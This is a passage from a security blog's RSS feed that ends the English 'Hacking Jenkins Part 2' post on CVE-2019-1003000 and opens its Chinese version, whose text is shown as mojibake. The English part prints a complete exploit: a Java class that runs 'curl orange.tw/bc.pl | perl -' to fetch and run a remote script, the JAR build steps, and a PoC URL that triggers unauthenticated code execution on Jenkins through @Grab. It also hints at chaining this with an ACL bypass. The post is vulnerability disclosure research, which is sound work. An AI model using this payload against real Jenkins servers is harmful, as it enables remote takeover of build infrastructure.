&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;processOtherServices&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ClassLoader&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;File&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ZipFile&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ZipFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ZipEntry&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serializedCategoryMethods&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getEntry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;META-INF/services/org.codehaus.groovy.runtime.SerializedCategoryMethods&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serializedCategoryMethods&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;processSerializedCategoryMethods&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serializedCategoryMethods&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ZipEntry&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pluginRunners&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getEntry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;META-INF/services/org.codehaus.groovy.plugins.Runners&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pluginRunners&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;processRunners&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pluginRunners&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ZipException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ignore&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// ignore files we can&#39;t process, e.g. non-jar/zip artifacts&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// TODO log a warning&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;JAR file is just a subset of ZIP format. In the &lt;a href=&quot;https://github.com/groovy/groovy-core/blob/GROOVY_2_4_3/src/main/groovy/grape/GrapeIvy.groovy#L312&quot;&gt;processOtherServices(â€¦)&lt;/a&gt;, Grape registers servies if there are some specified entry points. Among them, the &lt;code class=&quot;highlighter-rouge&quot;&gt;Runner&lt;/code&gt; interests me. By looking into the implementation of &lt;a href=&quot;https://github.com/groovy/groovy-core/blob/GROOVY_2_4_3/src/main/groovy/grape/GrapeIvy.groovy#L335&quot;&gt;processRunners(â€¦)&lt;/a&gt;, we found this:&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;processRunners&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InputStream&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ClassLoader&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;readLines&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;GroovySystem&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;RUNNER_REGISTRY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;loadClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;it&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;trim&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;newInstance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here we see the &lt;code class=&quot;highlighter-rouge&quot;&gt;newInstance()&lt;/code&gt;. Does it mean that we can call &lt;code class=&quot;highlighter-rouge&quot;&gt;Constructor&lt;/code&gt; on any class? Yes, so, we can just create a malicious JAR file, and put the class name into the file &lt;code class=&quot;highlighter-rouge&quot;&gt;META-INF/services/org.codehaus.groovy.plugins.Runners&lt;/code&gt; and we can invoke the &lt;code class=&quot;highlighter-rouge&quot;&gt;Constructor&lt;/code&gt; and execute arbitrary code!&lt;/p&gt;

&lt;p&gt;Here is the full exploit:&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Orange&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Orange&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(){&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;curl orange.tw/bc.pl | perl -&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;-c&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;};&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;lang&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Runtime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getRuntime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmds&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;javac Orange.java
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; META-INF/services/
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;Orange &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; META-INF/services/org.codehaus.groovy.plugins.Runners
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
./Orange.java
./Orange.class
./META-INF
./META-INF/services
./META-INF/services/org.codehaus.groovy.plugins.Runners

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;jar cvf poc-1.jar tw/
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp &lt;/span&gt;poc-1.jar ~/www/tw/orange/poc/1/
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; http://[your_host]/tw/orange/poc/1/poc-1.jar
HTTP/1.1 200 OK
Date: Sat, 02 Feb 2019 11:10:55 GMT
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;PoC:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://jenkins.local/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile
?value=
@GrabConfig(disableChecksums=true)%0a
@GrabResolver(name=&#39;orange.tw&#39;, root=&#39;http://[your_host]/&#39;)%0a
@Grab(group=&#39;tw.orange&#39;, module=&#39;poc&#39;, version=&#39;1&#39;)%0a
import Orange;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Video:&lt;/p&gt;

&lt;center&gt;&lt;div class=&quot;videowrapper&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;420&quot; src=&quot;https://www.youtube.com/embed/abuH-j-6-s0&quot; frameborder=&quot;0&quot;&gt; &lt;/iframe&gt;&lt;/div&gt;&lt;/center&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;epilogue&quot;&gt;Epilogue&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;With the exploit, we can gain full access on remote Jenkins server! We use Meta-Programming to import malicious JAR file during compile-time, and executing arbitrary code by the Runner service! Although there is a built-in Groovy Sandbox(&lt;a href=&quot;https://wiki.jenkins.io/display/JENKINS/Script+Security+Plugin&quot;&gt;Script Security Plugin&lt;/a&gt;) on Jenkins to protect the Pipeline, itâ€™s useless because the vulnerability is in compile-time, not in run-time!&lt;/p&gt;

&lt;p&gt;Because this is an attack vector on Groovy core, all methods related to the Groovy parser are affected!  It breaks the developerâ€™s thought which there is no execution so there is no problem. It is also an attack vector that requires the knowledge about computer science. Otherwise, you cannot think of the Meta-Programming! Thatâ€™s what makes this vulnerability interesting. Aside from entry points &lt;code class=&quot;highlighter-rouge&quot;&gt;doCheckScriptCompile(...)&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;toJson(...)&lt;/code&gt; I reported, after the vulnerability has been fixed, &lt;a href=&quot;https://twitter.com/0ang3el&quot;&gt;Mikhail Egorov&lt;/a&gt; also found another &lt;a href=&quot;https://jenkins.io/security/advisory/2019-01-28/#SECURITY-1292&quot;&gt;entry point&lt;/a&gt; quickly to trigger this vulnerability!&lt;/p&gt;

&lt;p&gt;Apart from that, this vulnerability can also be chained with my previous exploit on &lt;a href=&quot;https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/&quot;&gt;Hacking Jenkins Part 1&lt;/a&gt; to bypass the Overall/Read restriction to a well-deserved pre-auth remote code execution. If you fully understand the article, you know how to chain :P&lt;/p&gt;

&lt;p&gt;Thank you for reading this article and hope you like it! Here is the end of Hacking Jenkins series, I will publish more interesting researches in the future :)&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE-en/</link>
                <guid>https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE-en</guid>
                <pubDate>Tue, 19 Feb 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Hacking Jenkins Part 2 - Abusing Meta Programming for Unauthenticated RCE!</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE-en/&quot;&gt;English Version&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/&quot;&gt;ä¸­æ–‡ç‰ˆæœ¬&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;å—¨! å¤§å®¶ä»Šå¤©éå¾—å¥½å—?&lt;/p&gt;

&lt;p&gt;é€™ç¯‡æ–‡ç« æ˜¯ Hacking Jenkins ç³»åˆ—çš„ä¸‹é›†! çµ¦é‚£äº›é‚„æ²’çœ‹éä¸Šç¯‡æ–‡ç« çš„åŒå­¸ï¼Œå¯ä»¥è¨ªå•ä¸‹é¢éˆçµï¼Œè£œå……ä¸€äº›åŸºæœ¬çŸ¥è­˜åŠäº†è§£ä¹‹å‰å¦‚ä½•å¾ Jenkins ä¸­çš„å‹•æ…‹è·¯ç”±æ©Ÿåˆ¶åˆ°ä¸²å‡ºå„ç¨®ä¸åŒçš„æ”»æ“Šéˆ!&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/&quot;&gt;Hacking Jenkins Part 1 - Play with Dynamic Routing&lt;br /&gt;
&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;å¦‚ä¸Šç¯‡æ–‡ç« æ‰€èªªï¼Œç‚ºäº†æœ€å¤§ç¨‹åº¦ç™¼æ®æ¼æ´çš„æ•ˆæœï¼Œæƒ³å°‹æ‰¾ä¸€å€‹ä»£ç¢¼åŸ·è¡Œçš„æ¼æ´å¯ä»¥èˆ‡ ACL ç¹éæ¼æ´æ­é…ï¼Œæˆç‚ºä¸€å€‹ä¸ç”¨èªè­‰çš„é ç«¯ä»£ç¢¼åŸ·è¡Œ! ä¸éåœ¨æœ€åˆçš„å˜—è©¦ä¸­å¤±æ•—äº†ï¼Œç”±æ–¼å‹•æ…‹è·¯ç”±æ©Ÿåˆ¶çš„ç‰¹æ€§ï¼ŒJenkins åœ¨é‡åˆ°ä¸€äº›å±éšªæ“ä½œæ™‚(å¦‚ &lt;a href=&quot;http://jenkins.local/script&quot;&gt;Script Console&lt;/a&gt;)éƒ½æœƒå†æ¬¡çš„æª¢æŸ¥æ¬Šé™! å°è‡´å°±ç®—å¯ä»¥ç¹éæœ€å‰é¢çš„ ACL å±¤ä¾ç„¶ç„¡æ³•åšå¤ªå¤šäº‹æƒ…!&lt;/p&gt;

&lt;p&gt;ç›´åˆ° Jenkins åœ¨ 2018-12-05 ç™¼ä½ˆçš„ &lt;a href=&quot;https://jenkins.io/security/advisory/2018-12-05/#SECURITY-595&quot;&gt;Security Advisory&lt;/a&gt; ä¿®å¾©äº†å‰è¿°æˆ‘æ‰€å›å ±çš„å‹•æ…‹è·¯ç”±æ¼æ´! ç‚ºäº†é–‹å§‹æ’°å¯«é€™ä»½æŠ€è¡“æ–‡ç« (Hacking Jenkins ç³»åˆ—æ–‡)ï¼Œæˆ‘é‡æ–°è¤‡ç¿’äº†ä¸€æ¬¡ç•¶åˆé€²è¡Œä»£ç¢¼å¯©æŸ¥çš„ç­†è¨˜ï¼Œç•¶ä¸­å°å…¶ä¸­ä¸€å€‹è·³æ¿(gadget)æƒ³åˆ°äº†ä¸€å€‹ä¸ä¸€æ¨£çš„åˆ©ç”¨æ–¹å¼ï¼Œå› è€Œæœ‰äº†é€™ç¯‡æ•…äº‹! é€™ä¹Ÿæ˜¯è¿‘æœŸæˆ‘æ‰€å¯«éè¦ºå¾—æ¯”è¼ƒæœ‰è¶£çš„æ¼æ´ä¹‹ä¸€ï¼Œéå¸¸æ¨è–¦å¯ä»¥ä»”ç´°é–±è®€ä¸€ä¸‹!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;æ¼æ´åˆ†æ&quot;&gt;æ¼æ´åˆ†æ&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;è¦è§£é‡‹é€™æ¬¡çš„æ¼æ´ &lt;a href=&quot;https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266&quot;&gt;CVE-2019-1003000&lt;/a&gt; å¿…é ˆè¦å¾ Pipeline é–‹å§‹è¬›èµ·! å¤§éƒ¨åˆ†é–‹ç™¼è€…æœƒé¸æ“‡ Jenkins ä½œç‚º CI/CD ä¼ºæœå™¨çš„å…¶ä¸­ä¸€å€‹åŸå› æ˜¯å› ç‚º Jenkins æä¾›äº†ä¸€å€‹å¾ˆå¼·å¤§çš„ Pipeline åŠŸèƒ½ï¼Œä½¿é–‹ç™¼è€…å¯ä»¥æ–¹ä¾¿çš„å»æ’°å¯«ä¸€äº› Build Script ä»¥å®Œæˆè‡ªå‹•åŒ–çš„ç·¨è­¯ã€æ¸¬è©¦åŠç™¼ä½ˆ! ä½ å¯ä»¥æƒ³åƒ Pipeline å°±æ˜¯ä¸€å€‹å°å°çš„å¾®èªè¨€å¯ä»¥å»å° Jenkins é€²è¡Œæ“ä½œ(è€Œå¯¦éš›ä¸Š Pipeline æ˜¯åŸºæ–¼ Groovy çš„ä¸€å€‹ DSL)&lt;/p&gt;

&lt;p&gt;ç‚ºäº†æª¢æŸ¥ä½¿ç”¨è€…æ‰€æ’°å¯«çš„ Pipeline Script æœ‰æ²’æœ‰èªæ³•ä¸Šçš„éŒ¯èª¤(Syntax Error)ï¼ŒJenkins æä¾›äº†ä¸€å€‹ä»‹é¢çµ¦ä½¿ç”¨è€…æª¢æŸ¥è‡ªå·±çš„ Pipeline! é€™è£¡ä½ å¯ä»¥æƒ³åƒä¸€ä¸‹ï¼Œå¦‚æœä½ æ˜¯ç¨‹å¼è¨­è¨ˆå¸«ï¼Œä½ è¦å¦‚ä½•å»å®Œæˆé€™å€‹åŠŸèƒ½å‘¢? ä½ å¯ä»¥è‡ªå·±å¯¦ç¾ä¸€å€‹èªæ³•æ¨¹(AST, Abstract Syntax Tree)è§£æå™¨å»å®Œæˆé€™ä»¶äº‹ï¼Œä¸éé€™å¤ªç´¯äº†ï¼Œæœ€ç°¡å–®çš„æ–¹å¼ç•¶ç„¶æ˜¯å¥—ç”¨ç¾æˆçš„æ±è¥¿!&lt;/p&gt;

&lt;p&gt;å‰é¢æåˆ°ï¼ŒPipeline æ˜¯åŸºæ–¼ Groovy æ‰€å¯¦ç¾çš„ä¸€å€‹ DSLï¼Œæ‰€ä»¥ Pipeline å¿…å®šä¹Ÿéµå®ˆè‘— Groovy çš„èªæ³•! æ‰€ä»¥æœ€ç°¡å–®çš„æ–¹å¼æ˜¯ï¼Œåªè¦ Groovy å¯ä»¥æˆåŠŸè§£æ(parse)ï¼Œé‚£å°±ä»£è¡¨é€™ä»½ Pipeline çš„èªæ³•ä¸€å®šæ˜¯å°çš„! Jenkins å¯¦ä½œæª¢æŸ¥çš„ç¨‹å¼ç¢¼ç´„æ˜¯ä¸‹é¢é€™æ¨£å­:&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;JSON&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;doCheckScriptCompile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nd&quot;&gt;@QueryParameter&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;CpsGroovyShell&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;trusted&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CpsGroovyShellFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;forTrusted&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;CpsGroovyShellFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;withParent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;trusted&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getClassLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CompilationFailedException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;JSONArray&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;fromObject&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CpsFlowDefinitionValidator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toCheckStatus&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toArray&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
